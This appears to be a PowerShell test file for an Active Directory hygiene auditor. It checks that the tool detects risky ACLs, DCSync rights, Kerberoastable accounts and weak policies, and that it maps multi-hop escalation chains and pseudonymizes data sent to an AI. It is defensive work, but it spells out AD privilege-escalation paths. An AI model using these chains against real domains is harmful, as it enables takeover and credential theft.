Assert-True (Has $r 'rodc_tier0_revealed' 'RODC01' 'Critical') 'Tier 0 password cached on an RODC managed by non-Tier 0 = Critical'
$rvDet = @($r.Findings | Where-Object { $_.Type -eq 'rodc_tier0_revealed' })[0].Detail
Assert-True ($rvDet -match 'adm\.neri' -and $rvDet -notmatch 'user005' -and $rvDet -notmatch 'RODC01\$' -and $rvDet -match 'Helpdesk') 'revealed list: only Tier 0 accounts named, managedBy mentioned'
$snapRo = Import-ADSnapshot (Join-Path $tmp 'demo.json')
$roDc = @($snapRo.domainControllers | Where-Object { $_.isReadOnly })[0]
$roDc.rodcPolicy.managedBy = @($snapRo.groups | Where-Object { $_.sid -eq "$rootSidX-512" })[0].distinguishedName
$roDc.rodcPolicy.allowed = @(@($snapRo.groups | Where-Object { $_.sid -eq "$rootSidX-571" })[0].distinguishedName)
$roDc.rodcPolicy.denied = @()
$rRo = Invoke-Analysis $snapRo
Assert-True (Has $rRo 'rodc_tier0_revealed' 'RODC01' 'High') 'Tier 0 password cached on an RODC managed by Tier 0 = High'
Assert-True ((Has $rRo 'rodc_prp_too_broad' 'RODC01') -and @($rRo.Findings | Where-Object { $_.Type -eq 'rodc_prp_too_broad' })[0].Detail -match 'denied list' -and @($rRo.Findings | Where-Object { $_.Type -eq 'rodc_prp_too_broad' })[0].Detail -notmatch 'Domain Users') 'RODC denied list without the Denied RODC group flagged'
$roDc.PSObject.Properties.Remove('rodcPolicy')
$rRo = Invoke-Analysis $snapRo
$neRo = @($rRo.NotEvaluated | ForEach-Object { $_.Type })
Assert-True (($neRo -contains 'rodc_prp_too_broad') -and ($neRo -contains 'rodc_tier0_revealed') -and -not @($rRo.Findings | Where-Object { $_.Type -like 'rodc_prp*' -or $_.Type -eq 'rodc_tier0_revealed' }).Count -and -not ($neRo -contains 'rodc_tier0_unprotected')) 'old snapshot without the RODC policy: both checks not evaluated and silent'
$snapRe = Import-ADSnapshot (Join-Path $tmp 'demo.json')
$snapRe.meta.collectionErrors = @([PSCustomObject]@{ section = 'rodcPolicy'; message = 'RODC01: Access is denied (synthetic)' })
Assert-True (@(Get-NotEvaluatedChecks -Index (New-SnapshotIndex -Snapshot $snapRe) -Snapshot $snapRe | Where-Object { $_.Type -eq 'rodc_tier0_revealed' }).Count -eq 1) 'RODC policy read failure: checks not evaluated'

# ------------------------------------------------------------------ deep
Write-Host "[deep]"
& (Join-Path $PSScriptRoot 'New-SyntheticSnapshot.ps1') -Scenario demo -Deep -OutFile (Join-Path $tmp 'deep.json') | Out-Null
$deep = Import-ADSnapshot (Join-Path $tmp 'deep.json')
$rd = Invoke-Analysis $deep
Assert-True (@($rd.NotEvaluated | Where-Object { $_.Type -eq 'dangerous_ace_anywhere' }).Count -eq 0) 'deep run evaluates dangerous_ace_anywhere'
Assert-True (Has $rd 'dangerous_ace_anywhere' 'MOOSEBANK\Helpdesk' 'High') 'deep: non-priv GenericAll over a DA'
Assert-True (Has $rd 'dangerous_ace_anywhere' 'NT AUTHORITY\Authenticated Users' 'Critical') 'deep: Authenticated Users WriteDacl on OU (Critical)'
Assert-True ((Has $rd 'dangerous_ace_anywhere' 'MOOSEBANK\IT-Ops' 'High') -and @($rd.Findings | Where-Object { $_.Type -eq 'dangerous_ace_anywhere' -and $_.Object -eq 'MOOSEBANK\IT-Ops' })[0].Detail -match 'User-Account-Restrictions') 'deep: WriteAccountRestrictions (RBCD) over a server flagged'
# The lab chain of tests\lab (what New-LabAttackPaths.ps1 plants) built into a deep snapshot, then read by Test-LabAttackMap.ps1.
$labDom = 'S-1-5-21-1111111111-2222222222-3333333333'; $labDn = 'DC=moosebank,DC=local'
$labJson = Get-Content -Raw (Join-Path $tmp 'deep.json') | ConvertFrom-Json
$mkG = { param($n, $rid) [PSCustomObject]@{ name = $n; samAccountName = $n; distinguishedName = "CN=$n,OU=IDWolfLab,$labDn"; sid = "$labDom-$rid"; groupScope = 'Global'; groupCategory = 'Security'; adminCount = $null; members = @() } }
$lh = & $mkG 'LabHelpdesk' 9101; $lo = & $mkG 'LabOps' 9102; $ls = & $mkG 'LabAdminsShadow' 9103
$labSvc = [PSCustomObject]@{ kind = 'user'; samAccountName = 'lab.svcsync'; distinguishedName = "CN=lab.svcsync,OU=IDWolfLab,$labDn"; sid = "$labDom-9104"; enabled = $true; userAccountControl = 512
    pwdLastSet = '2026-09-20T08:00:00.0000000Z'; lastLogonTimestamp = $null; whenCreated = '2026-09-20T08:00:00.0000000Z'; servicePrincipalNames = @(); adminCount = $null; primaryGroupId = 513
    description = ''; descriptionSuspicious = $false; sidHistory = @(); supportedEncryptionTypes = $null; allowedToDelegateTo = @(); rbcdPrincipals = @(); keyCredentialCount = 0; hasUnixPassword = $false }
$labJson.groups = @($labJson.groups) + @($lh, $lo, $ls)
$labJson.users = @($labJson.users) + @($labSvc)
$mkAce = { param($sid, $name, $rights, $ot) [PSCustomObject]@{ sid = $sid; name = $name; rights = $rights; accessType = 'Allow'; objectType = $ot; inheritedObjectType = '00000000-0000-0000-0000-000000000000'; inheritanceType = 'None'; isInherited = $false } }
$zeroGuid = '00000000-0000-0000-0000-000000000000'
$mkAcl = { param($victim, $class, $ace) [PSCustomObject]@{ target = "obj:$($victim.distinguishedName)"; distinguishedName = $victim.distinguishedName; objectClass = $class; ownerSid = "$labDom-512"; ownerName = 'MOOSEBANK\Domain Admins'; aces = @($ace) } }
$labJson.deepAcls = @($labJson.deepAcls) + @(
    (& $mkAcl $lo 'group' (& $mkAce $lh.sid 'MOOSEBANK\LabHelpdesk' 'GenericWrite' $zeroGuid))
    (& $mkAcl $ls 'group' (& $mkAce $lo.sid 'MOOSEBANK\LabOps' 'WriteDacl' $zeroGuid))
    (& $mkAcl $labSvc 'user' (& $mkAce $ls.sid 'MOOSEBANK\LabAdminsShadow' 'GenericAll' $zeroGuid)))
$rootAcl = @($labJson.acls | Where-Object { $_.target -eq 'DomainRoot' })[0]
$rootAcl.aces = @($rootAcl.aces) + @((& $mkAce $labSvc.sid 'MOOSEBANK\lab.svcsync' 'ExtendedRight' '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2'))
$labFile = Join-Path $tmp 'lab_chain.json'
[System.IO.File]::WriteAllText($labFile, ($labJson | ConvertTo-Json -Depth 20), (New-Object System.Text.UTF8Encoding($false)))
$hostExe = (Get-Process -Id $PID).Path
$labOut = & $hostExe -NoProfile -ExecutionPolicy Bypass -File (Join-Path $PSScriptRoot 'lab\Test-LabAttackMap.ps1') -Snapshot $labFile -OutHtml (Join-Path $tmp 'lab_map.html') 2>&1 | Out-String
Assert-True ($LASTEXITCODE -eq 0 -and $labOut -match 'chain test passed') "Test-LabAttackMap passes on a snapshot with the 4-step chain (exit $LASTEXITCODE)"
$labHtmlText = Get-Content -Raw (Join-Path $tmp 'lab_map.html')
Assert-True (([regex]::Matches($labHtmlText, "data-to='")).Count -ge 3) 'the lab chain map draws at least 3 hop arrows'
# LAPS readers surface only with the deep ACL sweep.
Assert-True (@($rd.NotEvaluated | Where-Object { $_.Type -eq 'laps_readers' }).Count -eq 0) 'deep run evaluates laps_readers'
Assert-True (Has $rd 'laps_readers' 'MOOSEBANK\Helpdesk' 'High') 'deep: non-Tier 0 principal can read a LAPS password'
Assert-True (@($rd.Findings | Where-Object { $_.Type -eq 'laps_readers' })[0].Detail -match '1 computer') 'laps_readers names the computer count'
Assert-True (@($rd.Findings | Where-Object { $_.Type -eq 'laps_readers' }).Count -eq 1) 'laps_readers: Tier 0-only reader (Domain Admins) not flagged'
Assert-True (@($r.NotEvaluated | Where-Object { $_.Type -eq 'laps_readers' }).Count -eq 1) 'non-deep run marks laps_readers not evaluated'
Assert-True (-not (Has $rd 'dangerous_ace_anywhere' 'MOOSEBANK\Domain Admins')) 'deep: privileged principal ACE not flagged'
$cleanUserAces = @($rd.Findings | Where-Object { $_.Type -eq 'dangerous_ace_anywhere' -and $_.Detail -match "user001" })
Assert-True ($cleanUserAces.Count -eq 0) 'deep: object with only default ACEs produces no finding'
Assert-True (@($r.NotEvaluated | Where-Object { $_.Type -eq 'dangerous_ace_anywhere' }).Count -eq 1) 'non-deep run marks dangerous_ace_anywhere not evaluated'

# --------------------------------------------------------------- partial
Write-Host "[partial]"
$partial = Import-ADSnapshot (Join-Path $tmp 'partial.json')
$rp = Invoke-Analysis $partial
$ne = @($rp.NotEvaluated | ForEach-Object { $_.Type })
Assert-True ($rp.Findings.Count -eq 157) "partial total findings: expected 157, got $($rp.Findings.Count)"
Assert-True (($ne -join ',') -eq 'fgpp_weak,dcsync_rights,sync_laps_rights,dangerous_ace_tier0,nonstandard_owner_tier0,gpp_cpassword,sysvol_script_secrets,dangerous_ace_anywhere,laps_readers,pwq_duplicate_passwords,pwq_default_password,pwq_empty_password,pwq_breached_password,pwq_cleartext_stored') "partial not-evaluated set: got $($ne -join ',')"

# ------------------------------------------------------------- mutations
Write-Host "[mutations]"
$m = Import-ADSnapshot (Join-Path $tmp 'demo.json')
$m.domain.passwordPolicy.complexityEnabled = $false
$m.domain.passwordPolicy.reversibleEncryptionEnabled = $true
$m.domain.passwordPolicy.minPasswordAgeDays = 0
$m.domain.passwordPolicy.passwordHistoryCount = 12
$m.domain.authPolicySiloCount = 2
$m.domain.lapsV2Schema = $false
$m.domain.domainMode = 'Windows2016Domain'
($m.users | Where-Object samAccountName -eq 'Guest').enabled = $true
$m.domainControllers = @($m.domainControllers | Where-Object { $_.name -ne 'DC02' })
$rm = Invoke-Analysis $m
Assert-True (Has $rm 'password_policy_no_complexity' 'Default Domain Policy') 'complexity disabled'
Assert-True (Has $rm 'reversible_encryption_policy' 'Default Domain Policy' 'Critical') 'reversible encryption policy'
Assert-True (Has $rm 'password_policy_min_age_zero' 'Default Domain Policy') 'min password age 0 detected'
Assert-True (Has $rm 'password_policy_history_weak' 'Default Domain Policy') 'short password history detected'
Assert-True (-not (Has $rm 'auth_policy_silo_unused' 'moosebank.local')) 'auth policy silos present -> no non-adoption finding'
Assert-True (Has $rm 'laps_not_deployed' 'moosebank.local') 'LAPS schema absent'
Assert-True (-not @($rm.Findings | Where-Object Type -eq 'laps_missing').Count) 'no per-computer LAPS findings when LAPS absent'
Assert-True (-not @($rm.Findings | Where-Object Type -eq 'functional_level_outdated').Count) '2016 functional level accepted'
Assert-True (Has $rm 'guest_enabled' 'Guest') 'Guest enabled'
Assert-True (Has $rm 'single_dc' 'DC01') 'single writable DC (RODC not counted)'

# ----------------------------------------------- exceptions and comparison
Write-Host "[exceptions / compare]"
$script:RefDate = ConvertTo-UtcDate $demo.meta.collectedAtUtc
$exc = @(
    [PSCustomObject]@{ type = 'kerberoastable_user'; object = 'svc_web'; reason = 'test'; owner = 'qa'; expires = '2027-01-01' }
    [PSCustomObject]@{ type = 'trust_no_selective_auth'; object = '*'; reason = 'test'; owner = 'qa'; expires = '' }
    [PSCustomObject]@{ type = 'inactive_user'; object = 'mario.rossi.old'; reason = 'expired'; owner = 'qa'; expires = '2026-01-01' }
)
$split = Split-FindingsByException -Findings $r.Findings -Exceptions $exc
Assert-True (@($split.Accepted).Count -eq 3) "accepted: expected 3, got $(@($split.Accepted).Count)"
Assert-True (@($split.Expired).Count -eq 1) 'expired exception detected'
Assert-True (@($split.Active | Where-Object { $_.Type -eq 'inactive_user' }).Count -eq 1) 'expired exception does not hide the finding'

$csv = Join-Path $tmp 'prev.csv'
Export-FindingsCsv -Findings $r.Findings -Path $csv
$cmp = Get-FindingsComparison -Findings $rm.Findings -PreviousCsv $csv
Assert-True (@($cmp.New | Where-Object Type -eq 'guest_enabled').Count -eq 1) 'comparison: new finding detected'
Assert-True (@($cmp.Resolved | Where-Object Type -eq 'dc_obsolete_os').Count -eq 1) 'comparison: resolved finding detected'

# HTML renders
$score = Get-HygieneScore -Findings $split.Active
$html = ConvertTo-ReportHtml -Snapshot $demo -Index $r.Index -PrivMap $r.PrivMap -Split $split -Score $score -NotEvaluated @() -Comparison $cmp -Config $config -ToolVersion 'test' -ElapsedText '0s'
Assert-True ($html -match '</html>\s*$' -and $html -match 'Accepted risks') 'HTML report renders with all sections'
Assert-True ($html -match 'Attack-path map' -and $html -match "class='attack-map'") 'HTML report includes the attack-path map'
# Attack graph model
$graph = Get-AttackGraph -Snapshot $demo -Index $r.Index -PrivMap $r.PrivMap -Findings $r.Findings
Assert-True (@($graph.Nodes).Count -gt 0) 'attack graph has escalation source nodes'
Assert-True (@($graph.Edges | Where-Object { $_.Kind -eq 'DCSync' }).Count -ge 1) 'attack graph has a DCSync edge'
# Multi-hop: A has a right over B, B has a right over C, C has DCSync. A must sit two hops from Tier 0.
$hopA = $r.Index.Users | Where-Object samAccountName -eq 'adm.rossi' | Select-Object -First 1
$hopB = $r.Index.Users | Where-Object samAccountName -eq 'adm.bianchi' | Select-Object -First 1
$hopC = $r.Index.Users | Where-Object samAccountName -eq 'loop.user' | Select-Object -First 1
$hopFindings = @(
    [PSCustomObject]@{ Type = 'dcsync_rights'; Object = "MOOSEBANK\$($hopC.samAccountName)"; ObjectType = 'acl'; ObjectDn = ''; Severity = 'Critical'; Detail = 'DCSync.' }
    [PSCustomObject]@{ Type = 'dangerous_ace_anywhere'; Object = "MOOSEBANK\$($hopB.samAccountName)"; ObjectType = 'acl'; ObjectDn = $hopC.distinguishedName; Severity = 'High'; Detail = "GenericWrite over user '$($hopC.samAccountName)'." }
    [PSCustomObject]@{ Type = 'dangerous_ace_anywhere'; Object = "MOOSEBANK\$($hopA.samAccountName)"; ObjectType = 'acl'; ObjectDn = $hopB.distinguishedName; Severity = 'High'; Detail = "WriteDacl over user '$($hopB.samAccountName)'." }
)
$hopGraph = Get-AttackGraph -Snapshot $demo -Index $r.Index -PrivMap $r.PrivMap -Findings $hopFindings
$lvl = @{}; foreach ($n in $hopGraph.Nodes) { $lvl[($n.Label -split '\\')[-1]] = $n.Level }
Assert-True ($lvl['adm.rossi'] -eq 2 -and $lvl['adm.bianchi'] -eq 1 -and $lvl['loop.user'] -eq 0) "attack graph: hop levels A=2, B=1, C=0 (got $($lvl['adm.rossi'])/$($lvl['adm.bianchi'])/$($lvl['loop.user']))"
Assert-True (@($hopGraph.Edges | Where-Object { $_.To -ge 0 }).Count -eq 2) 'attack graph: two edges are hops between boxes, not jumps to Tier 0'
$hopHtml = ConvertTo-AttackMapHtml -Snapshot $demo -Index $r.Index -PrivMap $r.PrivMap -Findings $hopFindings
Assert-True (([regex]::Matches($hopHtml, "data-to='")).Count -eq 2 -and $hopHtml -match 'hops of one chain') 'attack map HTML draws the hops and explains them'
# A right over an object that is neither a source nor Tier 0 is drawn dashed (unverified); a hop and a right over Tier 0 are not.
$plainUser = $r.Index.Users | Where-Object { $_.kind -eq 'user' -and -not (Test-IsPrivileged $r.PrivMap $_) } | Select-Object -First 1
$unvFindings = @([PSCustomObject]@{ Type = 'dangerous_ace_anywhere'; Object = 'MOOSEBANK\someone'; ObjectType = 'acl'; ObjectDn = $plainUser.distinguishedName; Severity = 'High'; Detail = "GenericAll over user '$($plainUser.samAccountName)'." })
$unvGraph = Get-AttackGraph -Snapshot $demo -Index $r.Index -PrivMap $r.PrivMap -Findings $unvFindings
Assert-True (@($unvGraph.Edges | Where-Object { $_.Unverified }).Count -eq 1) 'attack graph: ACL over a non-Tier 0, non-source object is unverified'
Assert-True (@($hopGraph.Edges | Where-Object { $_.Unverified }).Count -eq 0) 'attack graph: hops are not marked unverified'
$t0Obj = @($r.PrivMap.Groups.Values | Select-Object -First 1)[0].Group
$t0Graph = Get-AttackGraph -Snapshot $demo -Index $r.Index -PrivMap $r.PrivMap -Findings @([PSCustomObject]@{ Type = 'dangerous_ace_anywhere'; Object = 'MOOSEBANK\someone'; ObjectType = 'acl'; ObjectDn = $t0Obj.distinguishedName; Severity = 'High'; Detail = "GenericAll over group 'x'." })
Assert-True (@($t0Graph.Edges | Where-Object { $_.Unverified }).Count -eq 0) 'attack graph: ACL over a Tier 0 group is not unverified'
Assert-True ((ConvertTo-AttackMapHtml -Snapshot $demo -Index $r.Index -PrivMap $r.PrivMap -Findings $unvFindings) -match "stroke-dasharray='5,4'") 'attack map draws an unverified arrow dashed'
# Flat findings keep the old layout (no chain note, no hop arrows).
$flatHtml = ConvertTo-AttackMapHtml -Snapshot $demo -Index $r.Index -PrivMap $r.PrivMap -Findings @($hopFindings[0])
Assert-True ($flatHtml -notmatch "data-to='" -and $flatHtml -notmatch 'hops of one chain') 'attack map without chains keeps the flat layout'
Assert-True (@($graph.Trusts).Count -ge 1) 'attack graph includes external/forest trusts'

# ------------------------------------------------------------------ AI
Write-Host "[ai pseudonymization]"
$script:RefDate = ConvertTo-UtcDate $demo.meta.collectedAtUtc
$pz = New-Pseudonymizer -Snapshot $demo -Index $r.Index
$prompt = New-AiPrompt -Findings $r.Findings -Pz $pz -Snapshot $demo -Score $score -Comparison $cmp
Assert-True (@(Test-AiLeak -Pz $pz -Text $prompt).Count -eq 0) "leak check clean: $((Test-AiLeak -Pz $pz -Text $prompt) -join ', ')"
foreach ($secret in 'moosebank', 'MOOSEBANK', 'adm.rossi', 'svc_sql_admin', 'SRV-BACKUP01', 'sql01', 'app01', 'DC01', 'S-1-5-21-1111111111', 'partner.example', 'PSO-Admins', 'ext.admin', 'Groups.xml', 'Workstation Baseline', 'Inventory', 'fs01', 'dc-tools') {
    Assert-True ($prompt.IndexOf($secret, [StringComparison]::OrdinalIgnoreCase) -lt 0) "prompt must not contain '$secret'"
}
foreach ($kept in 'Domain Admins', 'krbtgt', 'Administrator', 'privileged_kerberoastable') {
    Assert-True ($prompt.Contains($kept)) "prompt keeps well-known '$kept'"
}
# Builtin names like "Users" stay as they are, or the leak check trips on "Domain Users".
$pzKeep = New-Pseudonymizer -Snapshot $demo -Index $r.Index
Assert-True (-not $pzKeep.Forward.ContainsKey('Users')) 'builtin group Users is kept, not tokenized'
$leakSample = 'Member of Domain Users and Users; Domain Admins.'
Assert-True (@(Test-AiLeak -Pz $pzKeep -Text $leakSample).Count -eq 0) 'no false-positive leak on kept builtin/well-known names'
$tok = $pz.Forward['svc_sql_admin']
Assert-True ((Unprotect-AiText $pz "Rotate $tok and HOST-1`$ now") -eq 'Rotate svc_sql_admin and SRV-BACKUP01$ now') 'token round trip (incl. computer $)'
$fake = [PSCustomObject]@{
    executive_summary = "Critical exposure around $tok."
    remediation_plan = @(
        [PSCustomObject]@{ title = '1. Fix delegation'; checks = @('rbcd_configured', 'not_a_real_check'); objects = @($tok); rationale = 'r'; effort = 'LOW'; caveats = 'c' }
        [PSCustomObject]@{ title = 'Invented'; checks = @('made_up'); objects = @(); rationale = 'x'; effort = 'high'; caveats = '' }
    )
    quick_wins = @('a', 'b'); monitoring = @([PSCustomObject]@{ checks = @('kerberoastable_user'); event_ids = @('4769', 'abc'); guidance = 'g' })
    attack_paths = @([PSCustomObject]@{ title = 'Service account to DA'; severity = 'Critical'; steps = @("$tok -> SPN", 'Tier 0'); narrative = "Crack $tok offline." })
    remediation_scripts = @(
        [PSCustomObject]@{ check = 'rbcd_configured'; powershell = "Set-ADComputer $tok -Clear msDS-AllowedToActOnBehalfOfOtherIdentity"; caveats = 'verify first' }
        [PSCustomObject]@{ check = 'not_a_real_check'; powershell = 'Remove-Everything'; caveats = 'x' }
    )
    triage = @(
        [PSCustomObject]@{ rank = 2; checks = @('kerberoastable_user'); objects = @($tok); rationale = 'crackable' }
        [PSCustomObject]@{ rank = 1; checks = @('rbcd_configured'); objects = @(); rationale = 'direct to DC' }
        [PSCustomObject]@{ rank = 3; checks = @('made_up'); objects = @(); rationale = 'drop me' }
    )
}
$ai = ConvertFrom-AiResponse -Raw $fake -Pz $pz -Findings $r.Findings -Model 'test'
Assert-True (@($ai.RemediationPlan).Count -eq 1) 'plan items referencing only unknown checks are dropped'
Assert-True ((@($ai.RemediationPlan)[0].Checks -join ',') -eq 'rbcd_configured') 'unknown check ids removed from plan item'
Assert-True (@($ai.RemediationPlan)[0].Title -eq 'Fix delegation' -and @($ai.RemediationPlan)[0].Effort -eq 'low') 'numbering stripped, effort normalized'
Assert-True ($ai.ExecutiveSummary -eq 'Critical exposure around svc_sql_admin.') 'summary de-tokenized'
Assert-True ((@($ai.Monitoring)[0].EventIds -join ',') -eq '4769') 'non-numeric event ids dropped'
# New AI sections
Assert-True (@($ai.AttackPaths).Count -eq 1 -and $ai.AttackPaths[0].Narrative -eq 'Crack svc_sql_admin offline.') 'attack path parsed and de-tokenized'
Assert-True (@($ai.AttackPaths)[0].Steps[0] -eq 'svc_sql_admin -> SPN') 'attack path steps de-tokenized'
Assert-True (@($ai.RemediationScripts).Count -eq 1) 'remediation script with unknown check dropped'
Assert-True (@($ai.RemediationScripts)[0].PowerShell -match 'Set-ADComputer svc_sql_admin') 'remediation script de-tokenized'
Assert-True (@($ai.Triage).Count -eq 2) 'triage drops unknown-check rows'
Assert-True (@($ai.Triage)[0].Rank -eq 1 -and (@($ai.Triage)[0].Checks -join ',') -eq 'rbcd_configured') 'triage sorted by rank'
$html2 = ConvertTo-ReportHtml -Snapshot $demo -Index $r.Index -PrivMap $r.PrivMap -Split $split -Score $score -NotEvaluated @() -Comparison $null -Config $config -ToolVersion 'test' -ElapsedText '0s' -AiResult $ai
Assert-True ($html2 -match 'ai-section' -and $html2 -match 'chart-row' -and ([regex]::Matches($html2, "class='pie-chart-wrap'")).Count -ge 4) 'HTML with AI section and the donut charts'
Assert-True (([regex]::Matches($html2, "pie-chart-title'>(All accounts|Password age|Password settings|Computers by operating system|Enabled computers by activity|Groups by scope)")).Count -ge 5) 'HTML has the directory donuts (accounts, password age and settings, computers, groups)'
Assert-True (($html2 -match 'Tier 0 members \(\d+\)') -and ($html2 -match '<b>Administrator</b>')) 'attack map section lists the Tier 0 members, Administrator included'
# With a password-quality report attached, one more donut shows the weak accounts.
$snapPq = Import-ADSnapshot (Join-Path $tmp 'demo.json')
$snapPq | Add-Member -NotePropertyName passwordQuality -NotePropertyValue ([PSCustomObject]@{ emptyPassword = @('temp.user'); clearTextPassword = @(); breachedPassword = @('svc_backup'); defaultOrUsernamePassword = @(); duplicatePasswordGroups = @(, @('svc_web', 'svc_app')) }) -Force
Assert-True ((Get-AdInfoChartsRow -Snapshot $snapPq -Index $r.Index) -match 'Password quality') 'password-quality donut appears when a report is attached'
Assert-True ((Get-AdInfoChartsRow -Snapshot $demo -Index $r.Index) -notmatch 'Password quality') 'no password-quality donut without a report'
Assert-True ($html2 -match 'Attack paths toward Tier 0' -and $html2 -match 'ai-script' -and $html2 -match 'Exploitability triage') 'HTML renders the new AI sections (paths, scripts, triage)'

# ------------------------------------------------------------ host / GPO
Write-Host "[host/gpo]"
Assert-True (Has $r 'ldap_signing_not_required' 'Domain Controllers' 'High') 'gpo: LDAP signing not required'
Assert-True (Has $r 'ldap_channel_binding_off' 'Domain Controllers') 'gpo: LDAP channel binding off'
Assert-True (Has $r 'ntlm_weak_lmcompat' 'Domain Controllers') 'gpo: weak LmCompatibilityLevel'
Assert-True (Has $r 'anonymous_sam_enum' 'Domain Controllers') 'gpo: anonymous SAM enumeration'
Assert-True (Has $r 'dangerous_privilege_right' 'Debug programs') 'gpo: SeDebug granted to non-Tier0'
Assert-True (-not (Has $r 'smb_signing_not_required')) 'gpo: SMB signing correctly required -> no finding'
Assert-True (-not (Has $r 'lm_hash_stored')) 'gpo: NoLMHash set via root GPO -> no finding'
Assert-True (Has $r 'audit_policy_insufficient' 'Domain Controllers') 'gpo: advanced audit policy gaps detected'
Assert-True (-not (Has $r 'audit_advanced_policy_missing')) 'gpo: audit present -> not flagged as fully missing'
Assert-True (Has $r 'wdigest_cleartext' 'Domain Controllers' 'High') 'gpo: WDigest cleartext enabled'
Assert-True (Has $r 'kerberos_rc4_allowed' 'Domain Controllers') 'gpo: Kerberos RC4/DES allowed'
Assert-True (Has $r 'lsass_not_protected' 'Domain Controllers') 'gpo: LSASS RunAsPPL not set'
Assert-True (Has $r 'smb_client_signing_not_required' 'Domain Controllers') 'gpo: SMB client signing not required'
Assert-True (Has $r 'kerberoastable_user' 'svc_smsa$') 'sMSA with SPN detected as Kerberoastable'
Assert-True (-not (Has $r 'kerberoastable_user' 'gmsa_sql$')) 'gMSA not flagged as Kerberoastable'

$auditDet = @($r.Findings | Where-Object { $_.Type -eq 'audit_policy_insufficient' })[0].Detail
Assert-True ($auditDet -match 'Kerberos Authentication Service' -and $auditDet -notmatch 'Credential Validation') 'gpo: audit gap lists missing subcats but not the satisfied ones'


# --------------------------------------------------- password quality (hashless)
Write-Host "[password quality]"
# Windows PowerShell 5.1 once wrote an empty list as {"value": [], "Count": 0}: that must read as "no accounts", not as one.
$wrapEmpty = '{"value":[],"Count":0}' | ConvertFrom-Json
$wrapTwo = '{"value":["a.one","b.two"],"Count":2}' | ConvertFrom-Json
Assert-True (@(ConvertTo-PqNameList $wrapEmpty).Count -eq 0) 'pwq: {value: [], Count: 0} is an empty list'
Assert-True ((@(ConvertTo-PqNameList $wrapTwo) -join ',') -eq 'a.one,b.two') 'pwq: {value: [...], Count: n} is unwrapped'
Assert-True ((@(ConvertTo-PqNameList @('x', 'y')) -join ',') -eq 'x,y' -and @(ConvertTo-PqNameList $null).Count -eq 0) 'pwq: plain lists and null still work'
# A report made without a weak-password list can't find breached passwords: that check is "not evaluated", not clean.
$pqNoList = Import-ADSnapshot (Join-Path $tmp 'demo.json')
$pqNoList | Add-Member -NotePropertyName passwordQuality -NotePropertyValue ([PSCustomObject]@{ weakListUsed = $false; duplicatePasswordGroups = @(); emptyPassword = @(); defaultOrUsernamePassword = @(); breachedPassword = @(); clearTextPassword = @() }) -Force
$neNoList = @(Get-NotEvaluatedChecks -Index (New-SnapshotIndex -Snapshot $pqNoList) -Snapshot $pqNoList | ForEach-Object { $_.Type })
Assert-True (($neNoList -contains 'pwq_breached_password') -and -not ($neNoList -contains 'pwq_empty_password')) 'pwq: no weak list -> only the breached-password check is not evaluated'
$pqNoList.passwordQuality.weakListUsed = $true
Assert-True (@(Get-NotEvaluatedChecks -Index (New-SnapshotIndex -Snapshot $pqNoList) -Snapshot $pqNoList | Where-Object { $_.Type -eq 'pwq_breached_password' }).Count -eq 0) 'pwq: with a weak list the breached-password check is evaluated'
$pqDemo = Import-ADSnapshot (Join-Path $tmp 'demo.json')
$pq = Get-Content -Raw (Join-Path $root 'examples\passwordquality.example.json') | ConvertFrom-Json
$pqDemo | Add-Member -NotePropertyName passwordQuality -NotePropertyValue $pq -Force
$rpq = Invoke-Analysis $pqDemo
Assert-True (Has $rpq 'pwq_duplicate_passwords' '3 accounts' 'High') 'pwq: duplicate password cluster'
Assert-True (Has $rpq 'pwq_empty_password' 'temp.user' 'Critical') 'pwq: empty password'
Assert-True (Has $rpq 'pwq_breached_password' 'svc_backup') 'pwq: breached password'
Assert-True (Has $rpq 'pwq_cleartext_stored' 'revers.user') 'pwq: cleartext recoverable'
Assert-True (@($rpq.NotEvaluated | Where-Object { $_.Type -like 'pwq_*' }).Count -eq 0) 'pwq: checks evaluated when report supplied'

# ---------------------------------------------- container partial-failure gaps
Write-Host "[coverage gaps]"
$snapCE = Import-ADSnapshot (Join-Path $tmp 'demo.json')
$snapCE.meta.collectionErrors = @(
    [PSCustomObject]@{ section = 'gpo.{31B2F340-0000}'; message = 'null method (synthetic)' }
    [PSCustomObject]@{ section = 'adcs.ntAuth'; message = 'not found (synthetic)' }
)
$idxCE = New-SnapshotIndex -Snapshot $snapCE
$neCE = @(Get-NotEvaluatedChecks -Index $idxCE -Snapshot $snapCE | ForEach-Object { $_.Type })
Assert-True (-not ($neCE -contains 'smb_signing_not_required')) 'a single GPO failure does not blanket-block host checks'
Assert-True (-not ($neCE -contains 'adcs_esc1')) 'an NTAuth (optional) failure does not blanket-block AD CS checks'
# Old PS 5.1 snapshots hold {} for empty lists: no phantom SPN or delegation.
$phTxt = [System.IO.File]::ReadAllText((Join-Path $tmp 'demo.json'))
$phTxt = [regex]::Replace($phTxt, '"(servicePrincipalNames|allowedToDelegateTo|rbcdPrincipals)":\s*\[\s*\]', '"$1": {}')
$phPath = Join-Path $tmp 'phantom.json'; [System.IO.File]::WriteAllText($phPath, $phTxt)
$rph = Invoke-Analysis (Import-ADSnapshot $phPath)
Assert-True (-not (Has $rph 'kerberoastable_user' 'user001') -and -not (Has $rph 'rbcd_configured' 'user001') -and -not (Has $rph 'constrained_delegation' 'user001')) 'empty-object ({}) lists from PS 5.1 snapshots are not phantom values'
$rptCsv = Join-Path $tmp 'notasnap.csv'; '"Severity","Type"' | Set-Content $rptCsv
$rptErr = ''; try { Import-ADSnapshot $rptCsv | Out-Null } catch { $rptErr = $_.Exception.Message }
Assert-True ($rptErr -match 'report, not a snapshot') 'report CSV passed as snapshot gives a clear error'
# DNS read over LDAP (no RPC rights): only the zone-transfer check is a gap.
$snapDl = Import-ADSnapshot (Join-Path $tmp 'demo.json')
$snapDl.dns | Add-Member -NotePropertyName source -NotePropertyValue 'ldap' -Force
$neDl = @(Get-NotEvaluatedChecks -Index (New-SnapshotIndex -Snapshot $snapDl) -Snapshot $snapDl | ForEach-Object { $_.Type })
Assert-True (($neDl -contains 'dns_zone_transfer_allowed') -and -not ($neDl -contains 'dns_insecure_updates') -and -not ($neDl -contains 'dns_dangerous_record')) 'DNS via LDAP: only zone transfer not evaluated'

# score curve: informative (never a flat 0), higher penalty = lower score
$scoreBad = Get-HygieneScore -Findings (1..6 | ForEach-Object { [PSCustomObject]@{ Type = "c$_"; Severity = 'Critical' } })
$scoreWorse = Get-HygieneScore -Findings (1..20 | ForEach-Object { [PSCustomObject]@{ Type = "c$_"; Severity = 'Critical' } })
Assert-True ($scoreBad.Score -gt 1 -and $scoreBad.Score -gt $scoreWorse.Score) 'score curve saturates but stays informative (bad > worse > 0)'
